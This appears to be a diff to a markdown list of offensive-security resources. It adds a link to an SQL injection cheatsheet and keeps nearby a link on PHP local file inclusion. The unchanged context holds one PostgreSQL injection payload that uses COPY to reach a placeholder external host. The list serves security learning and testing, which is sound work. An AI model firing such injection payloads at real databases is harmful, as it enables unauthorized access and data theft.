@@ -819,6 +819,9 @@ https://arxiv.org/abs/1303.3047
 <br># PostgreSQL
 <br>```'||;COPY%20users(names)%20FROM%20'\\xpto.example.com\';||'```
 
+https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet
+<br># This repository contains a advanced methodology of all types of SQL Injection.
+
 ### <a name="LDI-Manual"></a>LFI (Local File Inclusion)
 https://bierbaumer.net/security/php-lfi-with-nginx-assistance/
 <br># This post presents a new method to exploit local file inclusion (LFI) vulnerabilities in utmost generality, assuming only that PHP is running in combination with Nginx under a common standard configuration.
